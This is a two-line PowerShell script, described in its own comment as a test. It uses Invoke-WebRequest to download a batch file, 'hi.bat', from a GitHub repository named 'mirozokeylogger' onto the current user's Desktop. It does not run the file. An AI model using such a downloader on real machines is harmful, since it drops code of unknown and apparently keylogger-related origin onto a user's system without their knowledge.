#This is download script as a test to download a file onto desktop
Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/hi.bat" -OutFile "C:\Users\$env:USERNAME\Desktop\hi.bat"